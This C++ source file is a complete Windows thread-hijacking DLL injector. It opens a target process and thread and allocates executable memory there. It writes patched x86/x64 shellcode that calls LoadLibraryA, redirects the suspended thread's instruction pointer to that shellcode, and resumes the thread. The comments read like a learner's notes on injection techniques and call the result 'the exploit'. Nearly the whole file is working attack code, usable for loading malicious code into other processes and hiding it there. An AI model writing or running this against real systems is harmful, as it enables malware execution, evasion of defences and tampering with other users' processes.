// ThreadHijack.cpp : This file contains the 'main' function. Program execution begins and ends there.
// Usage: ThreadHijack.exe <pid> <absolutepathtodll>

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#ifndef _WIN64
void __declspec(naked) InjectedFunction() { //due to ASLR, the below is simply dummy placeholder shellcode, which will be updated dynamic to contain the address to load library function
	__asm {
		pushad //here we preserve the application stack by pushing all registers onto the stack (i fucking LOVE assembly)
		push        11111111h //push path to dll onto the stack to fulfill the first argument for load libray function
		mov         eax, 22222222h //move pointer to load library function into eax
		call        eax //execute ptr to function in eax
		popad //retrieve our stored registers
		push        33333333h //push the address we want the thread to return to, we would have saved this via THREAD_CONTEXT
		ret
	}
}

// 32 bit assembled code (from some address):

// F91BF0 60                   pushad
// F91BF1 68 11 11 11 11       push        11111111h
// F91BF6 B8 22 22 22 22       mov         eax, 22222222h
// F91BFB FF D0                call        eax
// F91BFD 61                   popad
// F91BFE 68 33 33 33 33       push        33333333h
// F91C03 C3                   ret

#endif


bool DoInjection(HANDLE hProcess, HANDLE hThread, PCSTR dllPath) {
#ifdef _WIN64
	BYTE code[] = {
		// sub rsp, 28h
		0x48, 0x83, 0xec, 0x28,
		// mov [rsp + 18], rax
		0x48, 0x89, 0x44, 0x24, 0x18,
		// mov [rsp + 10h], rcx
		0x48, 0x89, 0x4c, 0x24, 0x10,
		// mov rcx, 11111111111111111h
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		// mov rax, 22222222222222222h
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		// call rax
		0xff, 0xd0,
		// mov rcx, [rsp + 10h]
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		// mov rax, [rsp + 18h]
		0x48, 0x8b, 0x44, 0x24, 0x18,
		// add rsp, 28h
		0x48, 0x83, 0xc4, 0x28,
		// mov r11, 333333333333333333h
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
		// jmp r11
		0x41, 0xff, 0xe3
	};
#else
	BYTE code[] = {
		0x60,
		0x68, 0x11, 0x11, 0x11, 0x11,
		0xb8, 0x22, 0x22, 0x22, 0x22,
		0xff, 0xd0,
		0x61,
		0x68, 0x33, 0x33, 0x33, 0x33,
		0xc3
	};
#endif

	const int page_size = 1 << 12;

	//
	// allocate buffer in target process to hold DLL path and injected function code
	//
	auto buffer = (char*)VirtualAllocEx(hProcess, nullptr, page_size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //memory space now requires execute permissions as well unlike previous techniques,this is because it needs to run shellcode (previously we simply provided a DLL path and as such only required read/write)
	if (!buffer)
		return false;

	//
	// suspend the target thread and get its context
	//
	if (SuspendThread(hThread) == -1) //suspend thread in order to get the context (the state of all its registers) - obviously needs to be suspended so it does not continue execution as we manipulate it
		return false;

	CONTEXT context; //CONTEXT is a platform specific structure
	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &context)) {
		ResumeThread(hThread); //here we resume the thread even on error to prerserve normal execution
		return false;
	}

	void* loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"); //generic pointer to LoadLibrary function from kernel32.dll

#ifdef _WIN64 //byte manipulation to override the addresses pushed/moved onto the stack
	// set dll path
	* (PVOID*)(code + 0x10) = (void*)(buffer + page_size / 2);
	// set LoadLibraryA address
	*(PVOID*)(code + 0x1a) = loadLibraryAddress;
	// jump address (back to the original code)
	*(unsigned long long*)(code + 0x34) = context.Rip;
#else
	// set dll path
	* (PVOID*)(code + 2) = (void*)(buffer + page_size / 2); //dll path written 2kb from start of memory buffer
	// set LoadLibraryA address
	*(PVOID*)(code + 7) = loadLibraryAddress;
	// jump address (back to the original code)
	*(unsigned*)(code + 0xf) = context.Eip;
#endif

	//
	// copy the injected function into the buffer
	//
	if (!WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr)) { //after code has been adjusted, write to buffer in target process
		ResumeThread(hThread);
		return false;
	}

	//
	// copy the DLL name into the buffer
	//
	if (!WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, strlen(dllPath), nullptr)) { //write our dll path 2kb into the start of memory in order to make way for our shellcode
		ResumeThread(hThread);
		return false;
	}

	//
	// change thread context to redirect execution via manipulation of eip (rip for x64)
	//
#ifdef _WIN64
	context.Rip = (unsigned long long)buffer;
#else
	context.Eip = (DWORD)buffer; //buffer is where we placed our shellcode, so we change iep to here
#endif
	if (!SetThreadContext(hThread, &context)) //let the thread make the change with thread context
		return false;

	ResumeThread(hThread); //here we complete the "hijack", where we resume the thread, except it will resume with our shellcode in eip, thus completing the exploit

	return true;
}

int Error(const char* message) {
	printf("%s (%u)\n", message, GetLastError());
	return 1;
}

int GetFirstThreadInProcess(int pid) {
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	THREADENTRY32 te = { sizeof(te) };
	if (!Thread32First(hSnapshot, &te)) { //grab first thread in process
		CloseHandle(hSnapshot);
		return 0;
	}

	int tid = 0;
	do {
		if (te.th32OwnerProcessID == pid) {
			tid = te.th32ThreadID;
			break;
		}
	} while (Thread32Next(hSnapshot, &te));

	CloseHandle(hSnapshot);
	return tid;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: ThreadHijack <pid> <dllPath>\n");
		return 0;
	}

	auto pid = atoi(argv[1]);

	//
	// open handle to process
	//
	auto hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
	if (!hProcess)
		return Error("Failed to open process handle");

	DWORD tid = GetFirstThreadInProcess(pid);
	//
	// open handle to the thread
	//    
	auto hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, tid); //we set these access masks to: change context to new location of our shellcode, suspend and resume thread
	if (!hThread)
		return Error("Failed to open thread");

	if (!DoInjection(hProcess, hThread, argv[argc - 1]))
		return Error("Failed to inject DLL");

	// wake up thread if it has a UI
	PostThreadMessage(tid, WM_NULL, 0, 0); //code exuction will only occur when our hijacked thread gets CPU, as such, we will post a dummy message in the event that the thread is part of a process with a UI, as UI threads typaically wait on messages

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
